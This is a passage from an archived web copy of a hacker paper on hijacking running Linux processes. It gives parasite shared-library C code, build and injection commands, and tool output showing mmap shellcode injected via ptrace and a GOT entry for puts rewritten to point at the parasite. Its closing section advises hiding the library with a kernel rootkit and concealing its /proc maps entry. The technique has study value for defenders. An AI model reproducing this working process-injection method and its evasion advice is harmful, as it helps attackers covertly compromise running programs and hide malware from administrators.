&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :<span style="color: #ff0000;">"0"</span> <span style="color: black;">(</span>SYS_write<span style="color: black;">)</span>, <span style="color: #ff0000;">"S"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> fd<span style="color: black;">)</span>,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"c"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> buf<span style="color: black;">)</span>, <span style="color: #ff0000;">"d"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> count<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ret &gt;= <span style="color: #cc66cc;">0</span><span style="color: black;">)</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span><span style="color: #993333;">int</span><span style="color: black;">)</span> ret;<br>
&nbsp; <span style="color: black;">}</span><br>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">int</span><br>
evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *buf<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<br>
&nbsp; <span style="color: #808080; font-style: italic;">/* allocate strings on the stack */</span><br>
&nbsp; <span style="color: #808080; font-style: italic;">/* so they aren't stored in .rodata */</span><br>
<br>
&nbsp; <span style="color: #993333;">char</span> new_string<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'e'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'v'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'i'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'l'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; <span style="color: #993333;">char</span> msg<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'I'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">' '</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'a'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'m'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; <span style="color: #993333;">char</span> nl<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;nl<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>= <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\n</span>'</span>;<br>
<br>
&nbsp; <span style="color: #993333;">int</span> <span style="color: black;">(</span>*origfunc<span style="color: black;">)</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *p<span style="color: black;">)</span> = 0x00000000;<br>
<br>
&nbsp; <span style="color: #808080; font-style: italic;">/* just to demonstrate calling */</span><br>
&nbsp; <span style="color: #808080; font-style: italic;">/* a syscall from our shared lib */</span><br>
&nbsp; _write<span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, <span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>msg, <span style="color: #cc66cc;">4</span><span style="color: black;">)</span>;<br>
&nbsp; _write<span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, <span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>nl, <span style="color: #cc66cc;">1</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; <span style="color: #808080; font-style: italic;">/* pass our new arg to the original function */</span><br>
&nbsp; origfunc<span style="color: black;">(</span>new_string<span style="color: black;">)</span>;<br>
&nbsp;<br>
&nbsp; <span style="color: #808080; font-style: italic;">/*<br>
&nbsp; Remember this is an alternative way to transfer control back --<br>
&nbsp; __asm__ __volatile__<br>
&nbsp; ("movl %ebp, %esp\n" "pop %ebp\n" "movl $0x00000000, %eax\n" "jmp *%eax");<br>
&nbsp; */</span><br>
<span style="color: black;">}</span><br>
<br>
<br>
<span style="color: #993333;">void</span><br>
_init <span style="color: black;">(</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<span style="color: black;">}</span><br>
<span style="color: #993333;">void</span><br>
_fini <span style="color: black;">(</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Here is an example:</p>
<pre class="source">localhost # gcc -fPIC -c libtest.c -nostdlib
localhost # ld -shared -o libtest.so.1.0 libtest.o
localhost # cp libtest.so.1.0 /lib
localhost # gcc dlh.c -o dlh
localhost # ps aux | grep test
root     16651  0.0  0.0   1436   308 pts/25   S+   12:34   0:00 ./test
localhost # ./dlh 16651 puts

%eip -&gt; 0xb7e60e9b
Injecting mmap_shellcode at 0x8048000
Here is the saved code we will be overwriting:

\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00
\x01\x00\x00\x00\x40\x83\x04\x08\x34\x00\x00\x00\x04\x12\x00\x00\x00\x00\x00\x00
\x34\x00\x20\x00\x09\x00\x28\x00\x1d\x00\x1a\x00\x06\x00\x00\x00\x34\x00\x00\x00
\x34\x80\x04\x08\x34\x80\x04\x08\x20\x01\x00\x00\x20\x01\x00\x00\x05\x00\x00\x00
\x04\x00\x00\x00\x03\x00\x00\x00\x54\x01

Verifying shellcode was injected properly, does this look ok?

\xe9\x3b\x00\x00\x00\x31\xc9\xb0\x05\x5b\x31\xc9\xcd\x80\x83\xec\x18\x31\xd2\x89
\x14\x24\xc7\x44\x24\x04\x00\x20\x00\x00\xc7\x44\x24\x08\x07\x00\x00\x00\xc7\x44
\x24\x0c\x02\x00\x00\x00\x89\x44\x24\x10\x89\x54\x24\x14\xb8\x5a\x00\x00\x00\x89
\xe3\xcd\x80\xcc\xe8\xc0\xff\xff\xff\x2f\x6c\x69\x62\x2f\x6c\x69\x62\x74\x65\x73
\x74\x2e\x73\x6f\x2e\x31\x2e\x30\x00\x00

Setting %eip to 0x8048000
%eip is now at 0x8048040, resetting it to 0xb7e60e9b
inserting original code back
Reading from process image at 0xb7f0f000
Searching at library base [0xb7f0f000] for evil function
Printing parasite code -&gt;

55 89 e5 83 ec 18 c6 45 f7 65 c6 45 f8 76 c6 45 f9 69 c6 45
fa 6c c6 45 fb 00 c6 45 f2 49 c6 45 f3 20 c6 45 f4 61 c6 45
f5 6d c6 45 f6 00 c6 45 f1 0a
Evil Function location: b7f0f248
Modifying GOT entry: replace &lt;puts&gt; with b7f0f248
Modifying GOT(804a00c)
Successfully modified GOT entry

New GOT value: b7f0f248
Reading from process image at 0xb7f0f248
55 89 e5 83 ec 18 c6 45 f7 65 c6 45 f8 76 c6 45 f9 69 c6 45 fa 6c c6 45 fb 00
c6 45 f2 49 c6 45 f3 20 c6 45 f4 61 c6 45 f5 6d c6 45 f6 00 c6 45 f1 0a c7
Located transfer code; patching it with b7e2b5c0
Injecting b7e2b5c0 at 0xb7f0f27d
Confirm transfer code: \xfc\xc0\xb5\xe2\xb7\x6a\x04
localhost #

At this point the target process has been hijacked

localhost # ./test
test!
test!
test!
test!
test!
test!
test!
test!
I am
evil
I am
evil
I am
evil
</pre>
<h2><a name="c8"></a>8 - After thoughts</h2>
<h3><a name="c81"></a>1 Improvements</h3>
<p>The method shown in this paper could probably be improved in many 
ways I have not thought of. The primary thing that come to mind is to 
provide a more flexible loader that does relocation, and does not 
require the parasite be compiled without relocations. This could be done
 especially easy when _dlopen_ was present in libc, and although 
__libc_dlopen_mode works similarly, I have not studied it enough or 
spent a whole lot of time trying to get it to work as a loader for a 
target process, as mmap() suites me. I think ultimately it would be a 
somewhat trivial task, but as this paper was merely a side step from my 
real project, it didn't seem worth pursuing since I have more 
significant projects.</p>
<h4><a name="c82"></a>2 ELFsh</h4>
<p>One other thing to mention is elfsh; elfsh is now apart of eresi -- 
ELF Reverse Engineering Software Interface. Elfsh is a scripting 
interpreter that can be used to implement hijackers (among many many 
other things) like the one in this paper (and more advanced) with very 
little effort. Check it: <a href="http://www.eresi-project.org/">http://www.eresi-project.org/</a></p>
<h4><a name="c83"></a>3 Staying hidden</h4>
<p>Keep in mind that it is imperative to make sure your shared object is
 hidden i.e via a kernel rootkit, otherwise its going to be easily found
 on disk. Additionally, the shared object that you are loading is 
visible in the /proc/&lt;pid&gt;/maps file and that line should always 
be hidden as well. Another alternative is of course to directly modify 
shared objects on the system which has the benefits of not making a mess
 anywhere else on disk but can be detected via regular md5 checks.</p>
<p>Thank you, and enjoy.</p>
<h2><a name="c9"></a>9 - References / Reading Material</h2>
<ol>
<li><a href="http://althing.cs.dartmouth.edu/local/subversiveld.pdf">Cheating the ELF</a> by grugq</li>
<li><a href="http://www.phrack.com/issues.html?issue=56&amp;id=7#article">ELF PLT infection</a> by Silvio</li>
<li><a href="http://em386.blogspot.com/2006/10/resolving-elf-relocation-name-symbols.html">ELF Relocation explained</a></li>
<li><a href="http://www.muppetlabs.com/~breadbox/software/ELF.txt">ELF Specification</a></li>
<li><a href="http://www.phrack.com/issues.html?issue=63&amp;id=9#article">Embedded ELF Debugging</a></li>
<li><a href="http://s.eresi-project.org/inc/articles/elf-rtld.txt">RTLD internals</a> by Mayhem</li>
<li><a href="http://linux.die.net/man/2/ptrace">ptrace(2)</a></li>
</ol>
[<a style="" href="https://web.archive.org/lib/?lang=EN&amp;index=UN#vrn00">Back to index</a>] [<a href="https://web.archive.org/comment.php?uri=lib:vrn00">Comments</a> (0)]<br><script type="text/javascript"><!--
google_ad_client = "pub-2785179539054532";
google_ad_slot = "6188198145";
google_ad_width = 468;
google_ad_height = 15;
//-->
</script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="https://web.archive.org/agreement.php">Terms of Use</a>!</small></div>
 
<div style="margin-top: 2px; float: left;" class="adsapeu">
</div>
<script type="text/javascript">var infolink_pid = 70507;</script><script type="text/javascript" src="http://resources.infolinks.com/js/infolinks_main.js"></script>
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script><script type="text/javascript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="https://web.archive.org/lib/index.php?lang=de&amp;id=vrn00">de</a><a href="https://web.archive.org/lib/index.php?lang=en&amp;id=vrn00">en</a><a href="https://web.archive.org/lib/index.php?lang=es&amp;id=vrn00">es</a><a href="https://web.archive.org/lib/index.php?lang=it&amp;id=vrn00">it</a><a href="https://web.archive.org/lib/index.php?lang=fr&amp;id=vrn00">fr</a><a href="https://web.archive.org/lib/index.php?lang=pl&amp;id=vrn00">pl</a><a href="https://web.archive.org/lib/index.php?lang=ru&amp;id=vrn00">ru</a><a href="https://web.archive.org/lib/index.php?lang=ua&amp;id=vrn00">ua</a></div>


</body></html>
